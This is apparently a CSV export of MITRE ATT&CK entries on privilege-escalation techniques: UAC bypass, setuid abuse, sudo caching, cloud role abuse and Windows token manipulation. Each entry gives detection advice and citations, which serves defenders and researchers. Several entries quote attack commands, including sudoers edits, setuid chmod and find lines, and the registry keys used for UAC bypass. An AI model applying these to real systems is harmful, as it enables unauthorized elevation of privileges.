ID,STIX ID,name,description,url,created,last modified,domain,version,tactics,detection,platforms,data sources,is_sub_technique,parent_technique,defenses bypassed,contributors,permissions required,supports remote,system requirements,impact type,effective permissions,relationship citations
T1548.002,attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073,Abuse Elevation Control Mechanism: Bypass User Account Control,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",https://attack.mitre.org/techniques/T1548/002,30 January 2020,21 April 2023,enterprise-attack,2.1,"Defense Evasion, Privilege Escalation","There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.

Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:

* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)

* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)

Analysts should monitor these Registry settings for unauthorized changes.",Windows,"Command: Command Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification",True,T1548,Windows User Account Control,Casey Smith; Stefan Kanthak,"Administrator, User",,,,Administrator,"(Citation: Mandiant No Easy Breach),(Citation: Trend Micro DRBControl February 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: FinFisher Citation),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Forcepoint Monsoon),(Citation: Antiy CERT Ramsay April 2020),(Citation: Secure List Bad Rabbit),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: GitHub PoshC2),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Crowdstrike Indrik November 2018),(Citation: Microsoft FinFisher March 2018),(Citation: Trend Micro Tick November 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Malwarebytes Konni Aug 2021),(Citation: Group IB Cobalt Aug 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: ESET EvilNum July 2020),(Citation: NCC Group WastedLocker June 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: ClearSky MuddyWater Nov 2018),(Citation: ESET Gelsemium June 2021),(Citation: ESET InvisiMole June 2018),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Novetta Winnti April 2015),(Citation: F-Secure BlackEnergy 2014),(Citation: Cymmetria Patchwork),(Citation: Arxiv Avaddon Feb 2021),(Citation: Rancor Unit42 June 2018),(Citation: ESET Grandoreiro April 2020),(Citation: Microsoft BlackCat Jun 2022),(Citation: Talos Lokibot Jan 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: Medium KONNI Jan 2020),(Citation: Check Point Warzone Feb 2020),(Citation: McAfee Honeybee),(Citation: Eset Ramsay May 2020),(Citation: Github Koadic),(Citation: Securelist ScarCruft May 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: Nccgroup Emissary Panda May 2018),(Citation: ESET RTM Feb 2017),(Citation: Github PowerShell Empire),(Citation: ESET Sednit Part 3),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: ESET PipeMon May 2020),(Citation: ESET InvisiMole June 2020),(Citation: Github UACMe),(Citation: Fortinet Remcos Feb 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: BitDefender BADHATCH Mar 2021),(Citation: cobaltstrike manual),(Citation: GitHub Pupy),(Citation: Cisco H1N1 Part 2),(Citation: Dell Sakula),(Citation: Cybereason Bumblebee August 2022),(Citation: Github UACMe)"
T1548.004,attack-pattern--b84903f0-c7d5-435d-a69e-de47cc3578c0,Abuse Elevation Control Mechanism: Elevated Execution with Prompt,"Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. 

Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.

Adversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",https://attack.mitre.org/techniques/T1548/004,30 January 2020,19 October 2022,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation",Consider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that <code>AuthorizationExecuteWithPrivileges</code> is being executed. MacOS system logs may also indicate when <code>AuthorizationExecuteWithPrivileges</code> is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.,macOS,"Process: OS API Execution, Process: Process Creation",True,T1548,,"Erika Noerenberg, @gutterchurl, Carbon Black; Jimmy Astle, @AstleJimmy, Carbon Black","Administrator, User",,,,root,"(Citation: Carbon Black Shlayer Feb 2019),"
T1548.001,attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9,Abuse Elevation Control Mechanism: Setuid and Setgid,"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.

Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.

Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions.

Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)",https://attack.mitre.org/techniques/T1548/001,30 January 2020,15 March 2023,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.","Linux, macOS","Command: Command Execution, File: File Metadata, File: File Modification",True,T1548,,,User,,,,,"(Citation: OSX Keydnap malware),(Citation: ANSSI Sandworm January 2021),"
T1548.003,attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.

Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.""(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).

The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.

Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.

In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",https://attack.mitre.org/techniques/T1548/003,30 January 2020,14 March 2022,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.","Linux, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, Process: Process Metadata",True,T1548,,,User,,,,root,"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: hexed osx.dok analysis 2019),(Citation: objsee mac malware 2017),"
T1548.005,attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c,Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access,"Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. 

Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Google Cloud Just in Time Access 2023)(Citation: Azure Just in Time Access 2023)

Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account.(Citation: Google Cloud Service Account Authentication Roles) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) 

Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)

While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)

**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",https://attack.mitre.org/techniques/T1548/005,10 July 2023,03 October 2023,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation",,"Azure AD, IaaS, Office 365",User Account: User Account Modification,True,T1548,,"Arad Inbar, Fidelis Security",,,,,,","
T1134.002,attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf,Access Token Manipulation: Create Process with Token,"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.

While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",https://attack.mitre.org/techniques/T1134/002,18 February 2020,11 April 2023,enterprise-attack,1.2,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell (i.e. [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command or similar artifacts. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

If an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior.

Analysts can also monitor for use of Windows APIs such as <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",Windows,"Command: Command Execution, Process: OS API Execution",True,T1134,"File system access controls, System access controls, Windows User Account Control",Jonny Johnson; Vadim Khrykov,,,,,,"(Citation: CheckPoint Naikon May 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Konni Aug 2021),(Citation: ESET PipeMon May 2020),(Citation: McAfee Bankshot),(Citation: Medium KONNI Jan 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Talos ZxShell Oct 2014),(Citation: Novetta Blockbuster),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Novetta Blockbuster Tools),(Citation: Secureworks REvil September 2019),(Citation: Microsoft runas),(Citation: Microsoft Replace Process Token),(Citation: Microsoft Create Token)"
T1134.003,attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819,Access Token Manipulation: Make and Impersonate Token,"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.

This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.",https://attack.mitre.org/techniques/T1134/003,18 February 2020,11 April 2023,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.

Analysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",Windows,"Command: Command Execution, Process: OS API Execution",True,T1134,"File system access controls, System access controls, Windows User Account Control",Jonny Johnson,"Administrator, User",,,,SYSTEM,"(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: cobaltstrike manual),(Citation: Microsoft runas),(Citation: Microsoft Replace Process Token),(Citation: Microsoft Create Token)"
T1134.004,attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a,Access Token Manipulation: Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)

Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",https://attack.mitre.org/techniques/T1134/004,18 February 2020,03 May 2022,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)

Monitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.",Windows,"Process: OS API Execution, Process: Process Creation, Process: Process Metadata",True,T1134,"Heuristic Detection, Host Forensic Analysis","Wayne Silva, F-Secure Countercept","Administrator, User",,,,,"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET PipeMon May 2020),(Citation: Malwarebytes Konni Aug 2021),(Citation: CobaltStrike Daddy May 2017),"
T1134.005,attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023,Access Token Manipulation: SID-History Injection,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).

With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",https://attack.mitre.org/techniques/T1134/005,18 February 2020,09 February 2021,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)

Monitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)",Windows,"Active Directory: Active Directory Object Modification, Process: OS API Execution, User Account: User Account Metadata",True,T1134,,"Alain Homewood, Insomnia Security; Vincent Le Toux","Administrator, SYSTEM",,,,,"(Citation: Adsecurity Mimikatz Guide),(Citation: Github PowerShell Empire),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Microsoft Trust Considerations Nov 2014),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Microsoft SID Filtering Quarantining Jan 2009),(Citation: Microsoft Netdom Trust Sept 2012)"
T1134.001,attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d,Access Token Manipulation: Token Impersonation/Theft,"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.

When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",https://attack.mitre.org/techniques/T1134/001,18 February 2020,29 September 2023,enterprise-attack,1.2,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

Analysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",Windows,"Command: Command Execution, Process: OS API Execution",True,T1134,"File system access controls, System access controls, Windows User Account Control",Jonny Johnson,,,,,,"(Citation: FinFisher Citation),(Citation: Tarrask scheduled task),(Citation: FireEye Op RussianDoll),(Citation: Crowdstrike Indrik November 2018),(Citation: Microsoft FinFisher March 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: ESET Okrum July 2019),(Citation: McAfee Shamoon December 2018),(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: CheckPoint Naikon May 2020),(Citation: Bitdefender FIN8 July 2021),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: BitDefender BADHATCH Mar 2021),(Citation: cobaltstrike manual),(Citation: Symantec FIN8 Jul 2023),(Citation: GitHub Pupy),(Citation: McAfee Sodinokibi October 2019),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Microsoft runas),(Citation: Microsoft Replace Process Token),(Citation: Microsoft Create Token)"
